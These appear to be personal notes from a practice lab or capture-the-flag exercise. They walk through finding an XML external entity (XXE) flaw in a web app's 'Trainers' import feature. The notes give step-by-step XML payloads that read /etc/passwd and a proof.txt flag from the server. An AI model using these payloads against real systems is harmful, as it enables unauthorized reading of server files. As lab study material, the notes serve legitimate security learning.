
when navigating to `Trainers` identified `export ` and `import` which typically means `XXE`
![[Pasted image 20241209173748.png]]
clicking `export` gives us an example of what the `XXE` looks like
![[Pasted image 20241209174224.png]]
now we need to find the vulnerable field
example payload to adjust for testing, the `&xxe;` is how you test for each field - when you see `/etc/passwd` that is the vulnerable field
```xml
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe "Vulnerable to XXE">
]>
<entity-engine-xml>
<Product createdStamp="2021-06-04 08:15:49.363" createdTxStamp="2021-06-04 08:15:48.983" description="Giant Widget with Wheels" internalName="Giant Widget variant explosion" isVariant="N" isVirtual="Y" largeImageUrl="/images/products/WG-9943/large.png" lastUpdatedStamp="2021-06-04 08:16:18.521" lastUpdatedTxStamp="2021-06-04 08:16:18.258" primaryProductCategoryId="202" productId="XXE-0001" productName="Giant Widget with variant explosion" productTypeId="FINISHED_GOOD" productWeight="22.000000" quantityIncluded="10.000000" smallImageUrl="/images/products/WG-9943/small.png" virtualVariantMethodEnum="VV_VARIANTTREE">
<longDescription>&xxe;</longDescription>
</Product>
</entity-engine-xml>
```
used `XML FORMATTER` to properly format it
![[Pasted image 20241209174458.png]]
now we have something to work with
```xml
<?xml version="1.0"?>
<response>
	<id>1</id>
	<name>Robin Marjan</name>
	<proffesion>Web Development</proffesion>
	<bio>Robin is a web developer, mentor, and professor who is prominent in his field. He has been working in the industry for over 20 years and has seen it all. He is passionate about mentoring young developers and helping them learn the ropes. When he is not teaching or coding, he enjoys spending time with her family and friends.</bio>
	<imgPath>/assets/img/trainers/1.jpg</imgPath>
</response>
```
payload to work with:
`testing.xml` - this tests all fields
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe "Vulnerable to XXE">
]>
<response>
	<id>1</id>
	<name>&xxe;</name>
	<proffesion>&xxe;</proffesion>
	<bio>&xxe;</bio>
	<imgPath>/assets/img/trainers/1.jpg</imgPath>
</response>
```
created on kali to `import`
![[Pasted image 20241209174932.png]]
now we have a baseline of all showing `Vulnerable to XXE` we can go further to see if we can grab machine information
![[Pasted image 20241209175048.png]]
`testing2_etcpasswd.xml`
testing to see what field spits back out `/etc/passwd`
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<response>
	<id>1</id>
	<name>&xxe;</name>
	<proffesion>&xxe;</proffesion>
	<bio>&xxe;</bio>
	<imgPath>/assets/img/trainers/1.jpg</imgPath>
</response>
```
this crashed the entire website, and reverted,- lets test one field at a time 
`testing3_etcpasswd.xml`
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<response>
	<id>1</id>
	<name>hahaha</name>
	<proffesion>hahaha</proffesion>
	<bio>&xxe;</bio>
	<imgPath>/assets/img/trainers/1.jpg</imgPath>
</response>
```
we are able to grab `/etc/passwd`
![[Pasted image 20241209175551.png]]
now lets try to grab the `proof.txt` from root

`testing4_proof.xml`
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe SYSTEM "file:///proof.txt">
]>
<response>
	<id>1</id>
	<name>hahaha</name>
	<proffesion>hahaha</proffesion>
	<bio>&xxe;</bio>
	<imgPath>/assets/img/trainers/1.jpg</imgPath>
</response>
```

![[Pasted image 20241209175829.png]]